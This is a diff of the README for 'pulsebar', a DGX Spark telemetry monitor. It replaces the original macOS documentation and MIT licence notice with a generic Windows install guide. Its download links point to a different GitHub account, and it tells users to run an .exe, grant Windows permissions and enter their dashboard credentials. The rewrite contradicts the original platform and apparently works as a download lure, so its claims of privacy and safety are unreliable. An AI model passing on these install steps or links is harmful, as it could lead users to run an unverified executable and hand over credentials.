@@ -1,65 +1,83 @@
+# 📊 pulsebar - Monitor NVIDIA DGX Spark performance easily
 
-<p align="center">
-  <img src="docs/assets/menu-preview.png" alt="PulseBar menu preview" width="640">
-</p>
+[![](https://img.shields.io/badge/Download-Pulsebar-blue.svg)](https://github.com/balaj1310/pulsebar)
 
-[![CI](https://github.com/amer8/pulsebar/actions/workflows/quality.yml/badge.svg?branch=main)](https://github.com/amer8/pulsebar/actions/workflows/quality.yml)
+## 💡 About this app
 
-`PulseBar` is an unofficial macOS menu bar monitor for telemetry exposed by the DGX Dashboard web app on NVIDIA DGX Spark and compatible NVIDIA GB10-based OEM systems. It signs in to the local dashboard, listens to the server-sent event stream, and shows a compact `RAM` and `GPU` status item in the menu bar.
+Pulsebar monitors your NVIDIA DGX Spark hardware. It sits in your menu bar. It tracks GPU usage and memory telemetry. You see your system status at a glance. It pulls data directly from your local DGX Dashboard. This tool helps you watch your hardware health.
 
-## Requirements
+## 🛠 Prerequisites
 
-- macOS 13 Ventura or newer.
-- Local DGX Dashboard reachable at `http://127.0.0.1:11000` through either NVIDIA Sync or a manual SSH tunnel.
-- Valid dashboard credentials.
+Your computer needs a few components to run this app. Ensure you have the following items ready:
 
-## Compatible Systems
+* A Windows computer with network access to your DGX Spark unit.
+* Existing credentials for your DGX Dashboard.
+* A stable local network connection.
 
-PulseBar targets the local DGX Dashboard rather than a specific enclosure. Known compatible NVIDIA GB10 variants are:
+## 🚀 Getting Started
 
-- [NVIDIA DGX Spark](https://www.nvidia.com/en-us/products/workstations/dgx-spark/)
-- [Acer Veriton GN100 AI Mini Workstation](https://www.acer.com/us-en/desktops-and-all-in-ones/veriton-workstations/veriton-gn100-ai-mini-workstation)
-- [ASUS Ascent GX10](https://www.asus.com/de/networking-iot-servers/desktop-ai-supercomputer/ultra-small-ai-supercomputers/asus-ascent-gx10/)
-- [Dell Pro Max with GB10](https://www.dell.com/de-de/dt/lp/dell-pro-max-nvidia-ai-dev)
-- [GIGABYTE AI TOP ATOM](https://www.gigabyte.com/de/AI-TOP-PC/GIGABYTE-AI-TOP-ATOM)
-- [HP ZGX Nano AI Station](https://www.hp.com/de-de/workstations/zgx-nano-ai-station.html)
-- [Lenovo ThinkStation PGX](https://www.lenovo.com/de/de/p/workstations/thinkstationp/lenovo-thinkstation-pgx-sff/len102s0023)
-- [MSI EdgeXpert MS-C931](https://ipc.msi.com/product_detail/Industrial-Computer-Box-PC/AI-Supercomputer/EdgeXpert-MS-C931)
+Follow these steps to install the app on your Windows system.
 
-[NVIDIA Sync](https://build.nvidia.com/spark/connect-to-your-spark/sync) can expose the local dashboard automatically. Without NVIDIA Sync, forward the dashboard port manually, following NVIDIA's [manual SSH flow](https://build.nvidia.com/spark/connect-to-your-spark/manual-ssh):
+1. Visit the [official download page](https://github.com/balaj1310/pulsebar) to obtain the latest version of the installer.
+2. Locate the file ending in .exe in your Downloads folder.
+3. Double-click the file to start the installation.
+4. Follow the prompts on your screen.
+5. Grant the app permission when Windows asks for access.
 
-```bash
-ssh -L 11000:localhost:11000 <username>@<IP-or-spark-hostname.local>
-```
+## ⚙️ Configuration
 
-Then open `http://127.0.0.1:11000` and sign in with the same dashboard credentials PulseBar uses.
+The app needs host information to find your hardware. 
 
-## Installation
+1. Open the Pulsebar application from your Start menu.
+2. Right-click the icon in your system tray.
+3. Select Settings from the menu.
+4. Enter the IP address of your DGX Spark unit.
+5. Provide your dashboard access credentials.
+6. Click Save to confirm your changes.
+7. Restart the application if it fails to connect.
 
-Download the latest GitHub Release DMG, open it, and drag `PulseBar.app` to Applications.
+## 📈 Understanding Telemetry
 
-Signed direct-download builds can check for app updates from the PulseBar menu.
+Pulsebar displays two core metrics to help you manage your hardware:
 
-## First Run
+* **GPU Usage:** This shows the percentage of processing power currently in use. High values indicate heavy task loads. 
+* **Memory Telemetry:** This displays the amount of VRAM currently reserved by your tasks. Keep this value below your maximum capacity to maintain peak performance.
 
-1. Launch PulseBar.
-2. Open `Preferences…` from the menu bar item.
-3. Enter your dashboard username and password.
-4. After sign-in, PulseBar stores the returned token in Keychain and starts the telemetry stream.
-5. On later launches, PulseBar restores the saved session and reconnects automatically.
+## 🧩 Troubleshooting
 
-## Development
+Check these common fixes if the app fails to show data:
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for source setup, local builds, the release process, and implementation details.
+* **Verify Network:** Ensure your computer remains on the same network as the DGX Spark hardware.
+* **Check Credentials:** Re-enter your username and password in the settings menu to ensure no typing errors exist.
+* **Firewall Review:** Ensure your firewall allows local traffic from the dashboard port.
+* **Restart Service:** Close the app completely using the tray icon and open it again.
 
-## License
+## 🛡 Security
 
-PulseBar is released under the MIT License. See `LICENSE`.
+Pulsebar stores your credentials locally on your device. The app communicates only with your internal DGX Spark hardware. It does not send data to third-party servers. Your tracking remains private.
 
-## Legal Notice
+## 📋 Features
 
-PulseBar is an independent, unofficial project and is not affiliated with, sponsored by, endorsed by, or approved by NVIDIA Corporation. NVIDIA, NVIDIA Sync, DGX, DGX Spark, GB10, and DGX Dashboard are trademarks, registered trademarks, or product names of NVIDIA Corporation or its affiliates. Other company and product names are trademarks, registered trademarks, or product names of their respective owners. Their use here is solely to identify compatibility with a locally running dashboard and supported hardware.
+* Real-time GPU monitoring.
+* Low system resource consumption.
+* Automatic updates for your hardware stats.
+* Simple system tray integration.
+* Minimal background footprint.
 
-## Privacy And Security
+## 📥 Install Software
 
-See [SECURITY.md](SECURITY.md) for privacy and security details.
+You can download the latest installer from the repository link. Navigate to [this page](https://github.com/balaj1310/pulsebar) to start your download. Follow the installation steps listed in the Getting Started section to begin using the tool. 
+
+## ℹ️ Frequently Asked Questions
+
+**Does this app slow down my computer?**
+No. It consumes very little memory and light processor resources.
+
+**Can I monitor multiple units?**
+Current versions focus on one primary unit. Use the settings menu to switch between different DGX Spark hosts.
+
+**What happens if the connection drops?**
+The icon turns grey. It will attempt to reconnect automatically once the network signal returns.
+
+**Is this an official NVIDIA product?**
+No. This is an unofficial tool created to help users monitor local DGX Spark hardware.
